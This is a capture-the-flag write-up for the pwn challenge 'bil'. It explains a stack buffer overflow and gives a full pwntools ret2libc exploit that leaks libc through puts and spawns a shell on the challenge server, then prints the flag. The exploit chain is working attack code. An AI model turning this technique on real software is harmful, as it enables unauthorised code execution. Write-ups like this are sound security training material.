---
title: "pwn - bil"
date: 2026-05-10
tags: ["CyCTF-luxor", "pwn"]
categories: ["Machines&Challenges"]
difficulty: "None"
author: "z3r0s"
---

# bil - PWN Writeup

## Challenge Info
- **Name:** bil
- **Category:** PWN
- **Remote:** 0.cloud.chals.io:18850

## Files Provided
- `app` - ELF 64-bit binary
- `libc.so.6` - GLIBC 2.36
- `ld-linux-x86-64.so.2` - dynamic linker
- `flag` - placeholder flag

## Binary Analysis

### Checksec
| Protection | Status |
|---|---|
| RELRO | Full RELRO |
| Stack Canary | No |
| NX | Enabled |
| PIE | Disabled |

### Key Functions

**`vuln()` @ 0x4011c6**
```c
void vuln() {
    char buf[0x40];          // 64-byte buffer
    puts("Input:");
    read(0, buf, 0x190);    // reads 400 bytes into 64-byte buffer -> overflow
    if (buf[0] == 'Z')
        puts("Zzz...");
}
```

The vulnerability is straightforward: `read()` allows 0x190 (400) bytes into a 0x40 (64) byte stack buffer with no stack canary — a classic stack buffer overflow.

**`pop_rdi_ret()` @ 0x401176**
```asm
endbr64
pop rdi
ret
```
A conveniently provided ROP gadget.

## Exploitation Strategy: ret2libc

Since NX is enabled (no shellcode) but PIE is disabled (fixed addresses) and there's no canary, this is a textbook **ret2libc** via ROP.

### Stage 1 — Leak libc

Overflow the buffer (0x40 + 0x8 saved RBP = **0x48 bytes padding**) and build a ROP chain that:
1. `pop rdi; ret` → loads `puts@GOT` into RDI
2. `puts@PLT` → prints the runtime address of `puts` in libc
3. Returns to `main` for a second pass

### Stage 2 — Shell

Calculate libc base from the leak, then:
1. `ret` — for 16-byte stack alignment
2. `pop rdi; ret` → loads address of `"/bin/sh"` in libc
3. `system()` — spawns a shell

### Address Table

| Symbol | Address |
|---|---|
| `pop rdi; ret` | `0x40117a` |
| `ret` | `0x40117b` |
| `puts@PLT` | `0x401060` |
| `puts@GOT` | `0x403fd8` |
| `main` | `0x401211` |
| libc `puts` offset | `0x77980` |
| libc `system` offset | `0x4c490` |
| libc `"/bin/sh"` offset | `0x196031` |

## Exploit

```python
from pwn import *

context.binary = './app'

POP_RDI  = 0x40117a
RET      = 0x40117b
PUTS_PLT = 0x401060
PUTS_GOT = 0x403fd8
MAIN     = 0x401211
OFFSET   = 0x48

LIBC_PUTS   = 0x77980
LIBC_SYSTEM = 0x4c490
LIBC_BINSH  = 0x196031

p = remote("0.cloud.chals.io", 18850)

# Stage 1: Leak puts@libc, return to main
payload1  = b'A' * OFFSET
payload1 += p64(POP_RDI)
payload1 += p64(PUTS_GOT)
payload1 += p64(PUTS_PLT)
payload1 += p64(MAIN)

p.recvuntil(b'Input:\n')
p.send(payload1)

puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_addr - LIBC_PUTS
log.info(f"Libc base: {hex(libc_base)}")

# Stage 2: system("/bin/sh")
p.recvuntil(b'Input:\n')

payload2  = b'A' * OFFSET
payload2 += p64(RET)
payload2 += p64(POP_RDI)
payload2 += p64(libc_base + LIBC_BINSH)
payload2 += p64(libc_base + LIBC_SYSTEM)

p.send(payload2)
p.interactive()
```

## Flag

```
CyCTF{3021e16844f8fba8dab8c90c543e6a72}
```


<span id="no-password" style="display:none;">Z3R0S_NO_PASSWORD_PLEASE</span>
